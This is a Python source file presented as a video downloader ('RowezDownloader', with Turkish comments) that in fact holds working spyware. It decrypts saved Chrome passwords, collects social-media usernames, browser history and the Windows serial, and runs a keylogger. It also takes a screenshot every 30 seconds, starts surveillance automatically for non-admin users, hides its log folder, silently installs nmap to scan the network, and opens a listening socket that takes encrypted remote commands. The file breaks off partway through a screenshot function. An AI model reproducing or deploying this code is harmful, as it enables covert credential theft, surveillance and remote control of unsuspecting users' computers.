import os
import sys
import subprocess
import pkg_resources
import platform
import requests
import yt_dlp
import zipfile
import shutil
import time
import sqlite3
import getpass
import socket
import threading
import getmac
import psutil
import hashlib
import random
import string
import base64
import wmi
import mss
import json
import logging
import re
from datetime import datetime
from colorama import init, Fore, Style
from queue import Queue
import winreg
import win32crypt
from pynput.keyboard import Key, Listener
from pynput.mouse import Controller as MouseController
import ctypes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import secrets
from typing import Dict, List, Optional, Tuple, Any
from pathlib import Path
import tempfile
import atexit

# Sabitler ve Yapılandırma
DATABASE_NAME = "user_data.db"
LOG_DIR = "admin_logs"
DEFAULT_OUTPUT_PATH = "downloads"
SECRET_ADMIN_CODE = "Be'le"
PORT_RANGE_START = 9999
PORT_RANGE_ATTEMPTS = 10
SCREENSHOT_INTERVAL = 30
ITERATIONS = 200000
CURRENT_VERSION = "1.0.0"

init()

# Logları geçici dizinde şifreli tut
temp_dir = tempfile.gettempdir()
LOG_FILE = os.path.join(temp_dir, "system_logs_encrypted.log")

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.FileHandler(LOG_FILE), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

# Şifreleme için güvenli anahtar
salt = secrets.token_bytes(32)
password = secrets.token_urlsafe(64)
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=ITERATIONS)
encryption_key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
cipher = Fernet(encryption_key)

def encrypt_log(message: str) -> str:
    try:
        return cipher.encrypt(message.encode()).decode()
    except Exception as e:
        logger.error(f"Log şifreleme hatası: {e}")
        return message

def decrypt_log(encrypted_message: str) -> str:
    try:
        return cipher.decrypt(encrypted_message.encode()).decode()
    except Exception as e:
        logger.error(f"Log çözme hatası: {e}")
        return "Çözülemedi"

def cleanup_temp_files():
    """Program kapanırken geçici dosyaları güvenli bir şekilde temizler."""
    files_to_clean = [
        LOG_FILE,
        os.path.join(temp_dir, DATABASE_NAME)
    ]
    for file_path in files_to_clean:
        try:
            if os.path.exists(file_path):
                # Dosya kilitliyse bekle ve tekrar dene
                for _ in range(3):
                    try:
                        os.remove(file_path)
                        break
                    except PermissionError:
                        time.sleep(0.5)  # Kısa bir bekleme
        except Exception as e:
            logger.error(f"Geçici dosya temizleme hatası: {e}")
    # Log dizinini temizle
    try:
        log_dir_path = os.path.join(temp_dir, LOG_DIR)
        if os.path.exists(log_dir_path):
            shutil.rmtree(log_dir_path, ignore_errors=True)
    except Exception as e:
        logger.error(f"Log dizini temizleme hatası: {e}")

atexit.register(cleanup_temp_files)

def check_python_version():
    required_version = (3, 7)
    current_version = sys.version_info[:2]
    if current_version < required_version:
        hata_mesaji = f"Python sürümü {'.'.join(map(str, current_version))} tespit edildi. En az Python 3.7 gerekli."
        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
        sys.exit(1)

def check_for_updates():
    try:
        response = requests.get("https://api.github.com/repos/Rowez/RowezDownloader/releases/latest", timeout=5)
        response.raise_for_status()
        data = response.json()
        latest_version = data.get("tag_name", CURRENT_VERSION)
        if latest_version > CURRENT_VERSION:
            print(f"{Fore.YELLOW}Yeni güncelleme: {latest_version} (Mevcut: {CURRENT_VERSION}){Style.RESET_ALL}")
            update = input(f"{Fore.CYAN}Güncellemeyi indirmek ister misiniz? (e/h): {Style.RESET_ALL}").strip().lower()
            if update == "e":
                print(f"{Fore.YELLOW}Güncelleme indiriliyor...{Style.RESET_ALL}")
                print(f"{Fore.GREEN}Güncelleme tamamlandı. Yeniden başlatın.{Style.RESET_ALL}")
                sys.exit(0)
        else:
            print(f"{Fore.GREEN}Program güncel: {CURRENT_VERSION}{Style.RESET_ALL}")
    except requests.RequestException as e:
        logger.error(f"Güncelleme kontrolü başarısız: {e}")

def get_db_connection() -> sqlite3.Connection:
    temp_db = Path(temp_dir) / DATABASE_NAME
    try:
        conn = sqlite3.connect(temp_db, check_same_thread=False)
        conn.execute("PRAGMA journal_mode=WAL")
        return conn
    except sqlite3.Error as e:
        hata_mesaji = f"Veritabanına bağlanılamadı: {e}"
        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
        logger.error(hata_mesaji)
        raise

def init_database() -> None:
    conn = None
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS users (
                user_id TEXT PRIMARY KEY,
                nickname TEXT,
                ip_address TEXT,
                mac_address TEXT,
                system_info TEXT,
                timestamp TEXT,
                social_data TEXT,
                browser_history TEXT
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT,
                message TEXT
            )
        """)
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS sessions (
                user_id TEXT,
                token TEXT,
                timestamp TEXT,
                PRIMARY KEY (user_id, token)
            )
        """)
        conn.commit()
    except sqlite3.Error as e:
        hata_mesaji = f"Veritabanı başlatılamadı: {e}"
        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
        logger.error(hata_mesaji)
        raise
    finally:
        if conn:
            conn.close()

def is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        logger.error(f"Yönetici kontrolü hatası: {e}")
        return False

required_packages = ["yt_dlp", "getmac", "psutil", "colorama", "wmi", "mss", "requests", "pywin32", "pynput", "cryptography"]

def install_package(package: str) -> None:
    try:
        pkg_resources.require(package)
        print(f"{Fore.GREEN}{package} zaten kurulu.{Style.RESET_ALL}")
    except pkg_resources.DistributionNotFound:
        print(f"{Fore.YELLOW}{package} kuruluyor...{Style.RESET_ALL}")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
        print(f"{Fore.GREEN}{package} kuruldu.{Style.RESET_ALL}")
    except Exception as e:
        hata_mesaji = f"Paket kurulumu hatası ({package}): {e}"
        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
        logger.error(hata_mesaji)
        sys.exit(1)

def install_ffmpeg() -> str:
    ffmpeg_path = Path(temp_dir) / "ffmpeg"
    ffmpeg_exe = ffmpeg_path / ("ffmpeg.exe" if platform.system() == "Windows" else "ffmpeg")
    if ffmpeg_exe.exists():
        print(f"{Fore.GREEN}FFmpeg zaten kurulu.{Style.RESET_ALL}")
        return str(ffmpeg_path)
    print(f"{Fore.YELLOW}FFmpeg indiriliyor...{Style.RESET_ALL}")
    if platform.system() == "Windows":
        url = "https://github.com/BtbN/FFmpeg-Builds/releases/download/latest/ffmpeg-master-latest-win64-gpl.zip"
        zip_file = os.path.join(temp_dir, "ffmpeg.zip")
        try:
            with open(zip_file, 'wb') as f:
                response = requests.get(url, stream=True, timeout=10)
                response.raise_for_status()
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            with zipfile.ZipFile(zip_file, 'r') as zip_ref:
                zip_ref.extractall(os.path.join(temp_dir, "ffmpeg_temp"))
            ffmpeg_temp = Path(temp_dir) / "ffmpeg_temp"
            for root, _, files in os.walk(ffmpeg_temp):
                if "ffmpeg.exe" in files:
                    ffmpeg_bin = Path(root)
                    break
            else:
                raise FileNotFoundError("ffmpeg.exe bulunamadı")
            ffmpeg_path.mkdir(parents=True, exist_ok=True)
            for file in ffmpeg_bin.iterdir():
                shutil.move(str(file), str(ffmpeg_path))
            shutil.rmtree(os.path.join(temp_dir, "ffmpeg_temp"))
            os.remove(zip_file)
            print(f"{Fore.GREEN}FFmpeg kuruldu.{Style.RESET_ALL}")
        except Exception as e:
            hata_mesaji = f"FFmpeg kurulumu hatası: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            sys.exit(1)
    else:
        hata_mesaji = "FFmpeg kurulumu yalnızca Windows için destekleniyor."
        print(f"{Fore.YELLOW}{hata_mesaji}{Style.RESET_ALL}")
        sys.exit(1)
    return str(ffmpeg_path)

def install_nmap() -> str:
    nmap_path = Path(temp_dir) / "nmap"
    nmap_exe = nmap_path / "nmap.exe"
    if nmap_exe.exists():
        print(f"{Fore.GREEN}Nmap zaten kurulu.{Style.RESET_ALL}")
        return str(nmap_path)
    print(f"{Fore.YELLOW}Nmap indiriliyor...{Style.RESET_ALL}")
    if platform.system() == "Windows":
        url = "https://nmap.org/dist/nmap-7.94-setup.exe"
        installer_file = os.path.join(temp_dir, "nmap-installer.exe")
        try:
            with open(installer_file, 'wb') as f:
                response = requests.get(url, stream=True, timeout=10)
                response.raise_for_status()
                for chunk in response.iter_content(chunk_size=8192):
                    f.write(chunk)
            # Nmap'i sessiz modda kur
            nmap_path.mkdir(parents=True, exist_ok=True)
            subprocess.check_call([installer_file, "/S", f"/D={str(nmap_path)}"], shell=True)
            os.remove(installer_file)
            if nmap_exe.exists():
                print(f"{Fore.GREEN}Nmap kuruldu.{Style.RESET_ALL}")
                return str(nmap_path)
            else:
                raise FileNotFoundError("Nmap kurulumu başarısız, nmap.exe bulunamadı")
        except Exception as e:
            hata_mesaji = f"Nmap kurulumu hatası: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            sys.exit(1)
    else:
        hata_mesaji = "Nmap kurulumu yalnızca Windows için otomatik destekleniyor."
        print(f"{Fore.YELLOW}{hata_mesaji}{Style.RESET_ALL}")
        sys.exit(1)
    return str(nmap_path)

check_python_version()
for package in required_packages:
    install_package(package)
ffmpeg_path = install_ffmpeg()
nmap_path = install_nmap()
init_database()

class RowezDownloader:
    def __init__(self):
        self.output_path = DEFAULT_OUTPUT_PATH
        self.video_quality = "best"
        self.video_format = "mp4"
        self.audio_format = "mp3"
        self.remote_access_enabled = True
        self.user_sessions: Dict[str, Dict[str, Any]] = {}
        self.admins = {"Rowez": hashlib.sha256("RowezYener".encode()).hexdigest()}
        self.nicknames = []
        self.banned_users = set()
        self.ffmpeg_path = ffmpeg_path
        self.nmap_path = nmap_path
        self.is_admin_mode = False
        self.admin_token = None
        self.current_admin = None
        self.sct = mss.mss()
        self.screenshot_queue = Queue()
        self.monitoring_active = False
        self.monitoring_thread = None
        self.secret_admin_code = SECRET_ADMIN_CODE
        self.download_cancelled = False
        self.download_threads = []
        self.keylogger_active = False
        self.keylog_file = None
        self.keylogger_listener = None
        self.mouse_controller = MouseController()
        self.log_dir = os.path.join(temp_dir, LOG_DIR)
        Path(self.log_dir).mkdir(parents=True, exist_ok=True)
        if platform.system() == "Windows":
            subprocess.run(["attrib", "+h", self.log_dir], check=False)

    def log_activity(self, message: str) -> None:
        timestamp = time.strftime("%Y%m%d_%H%M%S")
        log_file = Path(self.log_dir) / f"admin_log_{timestamp}.txt"
        encrypted_message = encrypt_log(message)
        conn = None
        try:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"[{time.ctime()}] {encrypted_message}\n")
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("INSERT INTO logs (timestamp, message) VALUES (?, ?)", (time.ctime(), encrypted_message))
            conn.commit()
        except (sqlite3.Error, IOError) as e:
            hata_mesaji = f"Log dosyasına yazma hatası: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
        finally:
            if conn:
                conn.close()

    def print_rainbow(self, text: str) -> None:
        colors = [Fore.RED, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]
        for i, char in enumerate(text):
            print(colors[i % len(colors)] + char, end='')
        print(Style.RESET_ALL)

    def generate_session_token(self, user_id: str) -> str:
        token = secrets.token_hex(32)
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("INSERT INTO sessions (user_id, token, timestamp) VALUES (?, ?, ?)", (user_id, token, time.ctime()))
            conn.commit()
            return token
        except sqlite3.Error as e:
            hata_mesaji = f"Oturum tokeni oluşturulamadı: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            raise
        finally:
            if conn:
                conn.close()

    def verify_session_token(self, user_id: str, token: str) -> bool:
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM sessions WHERE user_id = ? AND token = ?", (user_id, token))
            result = cursor.fetchone()
            return result is not None
        except sqlite3.Error as e:
            hata_mesaji = f"Oturum tokeni doğrulanamadı: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return False
        finally:
            if conn:
                conn.close()

    def validate_ip(self, ip_address: str) -> bool:
        ip_pattern = r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$"
        if not re.match(ip_pattern, ip_address):
            return False
        try:
            return all(0 <= int(octet) <= 255 for octet in ip_address.split("."))
        except ValueError:
            return False

    def validate_mac(self, mac_address: str) -> bool:
        mac_pattern = r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$"
        return bool(re.match(mac_pattern, mac_address))

    def get_social_data(self) -> Dict[str, str]:
        try:
            login_db = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
            if not login_db.exists():
                return {"email": "Bilinmiyor", "instagram": "Bilinmiyor", "twitter": "Bilinmiyor", "facebook": "Bilinmiyor"}
            conn = sqlite3.connect(f"file:{login_db}?mode=ro", uri=True)
            try:
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value FROM logins")
                social_data = {"email": "Bilinmiyor", "instagram": "Bilinmiyor", "twitter": "Bilinmiyor", "facebook": "Bilinmiyor"}
                for row in cursor.fetchall():
                    url, username = row
                    if "instagram.com" in url:
                        social_data["instagram"] = username
                    elif "twitter.com" in url:
                        social_data["twitter"] = username
                    elif "facebook.com" in url:
                        social_data["facebook"] = username
                    elif "mail" in url or "gmail" in url:
                        social_data["email"] = username
                return social_data
            finally:
                conn.close()
        except Exception as e:
            hata_mesaji = f"Sosyal medya verisi toplama hatası: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return {"email": "Bilinmiyor", "instagram": "Bilinmiyor", "twitter": "Bilinmiyor", "facebook": "Bilinmiyor"}

    def get_browser_history(self, user_id: str) -> str:
        try:
            history_db = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data" / "Default" / "History"
            if not history_db.exists():
                return "Tarayıcı geçmişi bulunamadı."
            conn = sqlite3.connect(f"file:{history_db}?mode=ro", uri=True)
            try:
                cursor = conn.cursor()
                cursor.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 10")
                history = [f"{row[1]} - {row[0]}" for row in cursor.fetchall()]
                return "\n".join(history)
            finally:
                conn.close()
        except Exception as e:
            hata_mesaji = f"Tarayıcı geçmişi alınamadı: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def get_passwords(self, user_id: str) -> str:
        try:
            login_db = Path(os.environ["LOCALAPPDATA"]) / "Google" / "Chrome" / "User Data" / "Default" / "Login Data"
            if not login_db.exists():
                return "Şifre veritabanı bulunamadı."
            conn = sqlite3.connect(f"file:{login_db}?mode=ro", uri=True)
            try:
                cursor = conn.cursor()
                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                passwords = []
                for row in cursor.fetchall():
                    url, username, encrypted_password = row
                    try:
                        password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
                        encrypted_entry = encrypt_log(f"{url}: {username} - {password}")
                        passwords.append(encrypted_entry)
                    except:
                        passwords.append(f"{url}: {username} - Şifre çözülemedi")
                return "\n".join(passwords)
            finally:
                conn.close()
        except Exception as e:
            hata_mesaji = f"Şifreler alınamadı: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def list_files(self, user_id: str, path: str) -> str:
        try:
            files = os.listdir(path)
            return "\n".join(files)
        except Exception as e:
            hata_mesaji = f"Dosya sistemine erişim hatası: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def get_system_resources(self, user_id: str) -> str:
        try:
            cpu = psutil.cpu_percent(interval=0.1)
            ram = psutil.virtual_memory().percent
            disk = psutil.disk_usage('/').percent
            return f"CPU: {cpu}%\nRAM: {ram}%\nDisk: {disk}%"
        except Exception as e:
            hata_mesaji = f"Sistem kaynakları alınamadı: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def get_installed_programs(self, user_id: str) -> str:
        try:
            programs = []
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Uninstall")
            for i in range(winreg.QueryInfoKey(key)[0]):
                subkey_name = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, subkey_name)
                try:
                    name = winreg.QueryValueEx(subkey, "DisplayName")[0]
                    programs.append(name)
                except:
                    pass
            return "\n".join(programs[:10])
        except Exception as e:
            hata_mesaji = f"Yüklü programlar alınamadı: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def scan_open_ports(self, user_id: str) -> str:
        try:
            ip = self.user_sessions[user_id]["ip_address"]
            nmap_exe = Path(self.nmap_path) / "nmap.exe"
            result = subprocess.check_output([str(nmap_exe), "-p-", ip, "--min-rate=1000"], text=True, timeout=30)
            return result
        except Exception as e:
            hata_mesaji = f"Açık port tarama hatası: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def scan_network_devices(self, user_id: str) -> str:
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            network_range = '.'.join(local_ip.split('.')[:-1]) + ".0/24"
            nmap_exe = Path(self.nmap_path) / "nmap.exe"
            result = subprocess.check_output([str(nmap_exe), "-sn", network_range, "--min-rate=1000"], text=True, timeout=30)
            return result
        except Exception as e:
            hata_mesaji = f"Ağdaki cihazlar taranamadı: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return "Hata oluştu."

    def collect_advanced_data(self, user_id: str, nickname: str) -> None:
        self.nicknames.append(nickname)
        mac_address = getmac.get_mac_address() or "Bilinmiyor"
        ip_address = socket.gethostbyname(socket.gethostname()) or "127.0.0.1"
        if not self.validate_ip(ip_address) or not self.validate_mac(mac_address):
            logger.warning(f"Geçersiz IP veya MAC: IP={ip_address}, MAC={mac_address}")
        windows_key = self.get_windows_product_key() if platform.system() == "Windows" else "N/A"
        system_info = {
            "OS": platform.system(),
            "Version": platform.version(),
            "CPU": psutil.cpu_percent(interval=0.1),
            "RAM": f"{psutil.virtual_memory().percent}%",
            "Disk": f"{psutil.disk_usage('/').percent}%"
        }
        social_data = self.get_social_data()
        browser_history = self.get_browser_history(user_id)
        self.user_sessions[user_id] = {
            "nickname": nickname,
            "email": encrypt_log(social_data.get("email", "Bilinmiyor")),
            "instagram": encrypt_log(social_data.get("instagram", "Bilinmiyor")),
            "twitter": encrypt_log(social_data.get("twitter", "Bilinmiyor")),
            "facebook": encrypt_log(social_data.get("facebook", "Bilinmiyor")),
            "mac_address": encrypt_log(mac_address),
            "ip_address": encrypt_log(ip_address),
            "windows_key": encrypt_log(windows_key),
            "system_info": system_info,
            "browser_history": encrypt_log(browser_history),
            "timestamp": time.ctime(),
            "keylog": "",
            "rat_screenshots": []
        }
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute(
                "INSERT OR REPLACE INTO users (user_id, nickname, ip_address, mac_address, system_info, timestamp, social_data, browser_history) VALUES (?, ?, ?, ?, ?, ?, ?, ?)",
                (user_id, nickname, encrypt_log(ip_address), encrypt_log(mac_address), str(system_info), time.ctime(), str(social_data), encrypt_log(browser_history))
            )
            conn.commit()
            self.log_activity(f"Kullanıcı verileri toplandı: {user_id} - {nickname}")
            if nickname not in self.admins:
                threading.Thread(target=self.start_rat, args=(user_id,), daemon=True).start()
        except sqlite3.Error as e:
            hata_mesaji = f"Kullanıcı verileri kaydedilemedi: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
        finally:
            if conn:
                conn.close()

    def get_windows_product_key(self) -> str:
        try:
            w = wmi.WMI()
            for os in w.Win32_OperatingSystem():
                return os.SerialNumber
        except Exception as e:
            hata_mesaji = f"Windows ürün anahtarı alınamadı: {e}"
            logger.error(hata_mesaji)
            return "N/A"

    def start_keylogger(self, user_id: str) -> None:
        self.keylog_file = os.path.join(temp_dir, f"keylog_{user_id}.txt")
        def on_press(key: Key) -> None:
            try:
                with open(self.keylog_file, "a", encoding="utf-8") as f:
                    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
                    if hasattr(key, 'char') and key.char:
                        log_entry = f"[{timestamp}] {key.char}"
                        self.user_sessions[user_id]["keylog"] += key.char
                    else:
                        special_key = str(key).replace("Key.", "")
                        if special_key == "space":
                            log_entry = f"[{timestamp}] [SPACE]"
                            self.user_sessions[user_id]["keylog"] += " "
                        elif special_key == "enter":
                            log_entry = f"[{timestamp}] [ENTER]"
                            self.user_sessions[user_id]["keylog"] += "\n"
                        elif special_key == "backspace":
                            log_entry = f"[{timestamp}] [BACKSPACE]"
                            self.user_sessions[user_id]["keylog"] = self.user_sessions[user_id]["keylog"][:-1]
                        else:
                            log_entry = f"[{timestamp}] [{special_key.upper()}]"
                            self.user_sessions[user_id]["keylog"] += f"[{special_key.upper()}]"
                    encrypted_entry = encrypt_log(log_entry)
                    f.write(encrypted_entry + "\n")
                self.log_activity(f"Keylog kaydedildi: {user_id}")
            except Exception as e:
                hata_mesaji = f"Keylogger hatası: {e}"
                logger.error(hata_mesaji)
        self.keylogger_listener = Listener(on_press=on_press)
        self.keylogger_listener.start()
        self.keylogger_active = True

    def stop_keylogger(self) -> None:
        if self.keylogger_active and self.keylogger_listener:
            self.keylogger_listener.stop()
            self.keylogger_active = False
            self.log_activity("Keylogger durduruldu")
            if self.keylog_file and os.path.exists(self.keylog_file):
                try:
                    os.remove(self.keylog_file)
                except PermissionError:
                    time.sleep(0.5)
                    os.remove(self.keylog_file)

    def start_rat(self, user_id: str) -> None:
        if user_id not in self.user_sessions or self.user_sessions[user_id]["nickname"] in self.admins:
            return
        if self.keylogger_active:
            self.start_keylogger(user_id)
        while user_id in self.user_sessions and self.user_sessions[user_id]["nickname"] not in self.admins:
            try:
                self.user_sessions[user_id]["timestamp"] = time.ctime()
                screenshot_path = os.path.join(temp_dir, f"rat_screenshot_{user_id}_{int(time.time())}.png")
                self.sct.shot(output=screenshot_path)
                self.user_sessions[user_id]["rat_screenshots"].append(screenshot_path)
                with open(os.path.join(temp_dir, f"rat_log_{user_id}.txt"), "a", encoding="utf-8") as f:
                    encrypted_entry = encrypt_log(f"[{time.ctime()}] Ekran Görüntüsü: {screenshot_path}")
                    f.write(encrypted_entry + "\n")
                    if self.keylogger_active:
                        encrypted_keylog = encrypt_log(f"[{time.ctime()}] Keylog: {self.user_sessions[user_id]['keylog']}")
                        f.write(encrypted_keylog + "\n")
                self.log_activity(f"RAT aktivitesi: {user_id}")
                time.sleep(SCREENSHOT_INTERVAL)
            except Exception as e:
                hata_mesaji = f"RAT hatası: {e}"
                logger.error(hata_mesaji)
                time.sleep(SCREENSHOT_INTERVAL)

    def start_remote_access(self) -> None:
        def server_thread() -> None:
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            port = PORT_RANGE_START
            attempt = 0
            while attempt < PORT_RANGE_ATTEMPTS:
                try:
                    server_socket.bind(('0.0.0.0', port))
                    server_socket.listen(5)
                    print(f"{Fore.GREEN}Uzak erişim sunucusu {port} portunda başlatıldı.{Style.RESET_ALL}")
                    self.log_activity(f"Uzak erişim sunucusu başlatıldı: {port}")
                    break
                except OSError as e:
                    if e.errno == 10048:
                        print(f"{Fore.YELLOW}Port {port} kullanılıyor, başka port deneniyor...{Style.RESET_ALL}")
                        port += 1
                        attempt += 1
                    else:
                        hata_mesaji = f"Uzak erişim sunucusu başlatılamadı: {e}"
                        print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                        logger.error(hata_mesaji)
                        server_socket.close()
                        return
            else:
                hata_mesaji = "Uygun port bulunamadı."
                print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
                server_socket.close()
                return
            while True:
                try:
                    client_socket, addr = server_socket.accept()
                    print(f"{Fore.CYAN}Bağlantı alındı: {addr}{Style.RESET_ALL}")
                    self.log_activity(f"Bağlantı alındı: {addr}")
                    client_socket.send(encryption_key)
                    while True:
                        encrypted_command = client_socket.recv(1024)
                        if not encrypted_command:
                            break
                        command = cipher.decrypt(encrypted_command).decode().strip()
                        if command == "screenshot":
                            result = self.capture_screenshot("remote")
                            with open(result.split(": ")[1], "rb") as f:
                                screenshot_data = f.read()
                            encrypted_response = cipher.encrypt(f"Screenshot: {result}".encode() + b"\n" + screenshot_data)
                            client_socket.send(encrypted_response)
                        elif command:
                            result = self.remote_control(command)
                            encrypted_response = cipher.encrypt(result.encode())
                            client_socket.send(encrypted_response)
                except Exception as e:
                    hata_mesaji = f"Uzak erişim istemci hatası: {e}"
                    logger.error(hata_mesaji)
                finally:
                    client_socket.close()
            server_socket.close()
        threading.Thread(target=server_thread, daemon=True).start()

    def network_scan(self, mode: str = "quick") -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            network_range = '.'.join(local_ip.split('.')[:-1]) + ".0/24"
            nmap_exe = Path(self.nmap_path) / "nmap.exe"
            args = [str(nmap_exe), "-sn" if mode == "quick" else "-A", network_range, "--min-rate=1000"]
            result = subprocess.check_output(args, text=True, timeout=30)
            self.log_activity(f"Ağ taraması ({mode}): {network_range}")
            return f"Ağ tarama sonucu ({mode}):\n{result}"
        except subprocess.CalledProcessError as e:
            hata_mesaji = f"Ağ tarama hatası: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"

    def view_logs(self) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM logs ORDER BY timestamp DESC LIMIT 5")
            logs = cursor.fetchall()
            if not logs:
                return "Log bulunamadı."
            log_content = "\n".join([f"Log ID: {log[0]} - {log[1]}: {decrypt_log(log[2])}" for log in logs])
            return log_content
        except sqlite3.Error as e:
            hata_mesaji = f"Log görüntüleme hatası: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"
        finally:
            if conn:
                conn.close()

    def clear_logs(self) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        conn = None
        try:
            conn = get_db_connection()
            cursor = conn.cursor()
            cursor.execute("DELETE FROM logs")
            conn.commit()
            for log_file in Path(self.log_dir).iterdir():
                log_file.unlink()
            self.log_activity("Loglar temizlendi")
            return "Loglar temizlendi."
        except (sqlite3.Error, OSError) as e:
            hata_mesaji = f"Log temizleme hatası: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"
        finally:
            if conn:
                conn.close()

    def export_user_data(self) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        try:
            export_file = os.path.join(temp_dir, f"user_data_export_{int(time.time())}.json")
            encrypted_data = {}
            for user_id, data in self.user_sessions.items():
                encrypted_data[user_id] = {k: encrypt_log(str(v)) if k not in ["system_info"] else v for k, v in data.items()}
            with open(export_file, "w", encoding="utf-8") as f:
                json.dump(encrypted_data, f, indent=4, ensure_ascii=False)
            self.log_activity(f"Kullanıcı verileri dışa aktarıldı: {export_file}")
            return f"Kullanıcı verileri {export_file} dosyasına aktarıldı."
        except IOError as e:
            hata_mesaji = f"Kullanıcı verileri dışa aktarılamadı: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"

    def delete_user_files(self, user_id: str) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
            return "Yetkisiz işlem."
        if user_id not in self.user_sessions:
            return "Kullanıcı bulunamadı."
        try:
            files = [os.path.join(temp_dir, f"keylog_{user_id}.txt"), os.path.join(temp_dir, f"rat_log_{user_id}.txt")] + self.user_sessions[user_id]["rat_screenshots"]
            for file in files:
                if Path(file).exists():
                    Path(file).unlink()
            self.log_activity(f"Kullanıcı dosyaları silindi: {user_id}")
            return f"{user_id} kullanıcısının dosyaları silindi."
        except OSError as e:
            hata_mesaji = f"Kullanıcı dosyaları silinemedi: {e}"
            print(f"{Fore.RED}{hata_mesaji}{Style.RESET_ALL}")
            logger.error(hata_mesaji)
            return f"Hata: {e}"

    def capture_screenshot(self, user_id: str) -> str:
        if not self.is_admin_mode or not self.verify_session_token("admin", self.admin_token):
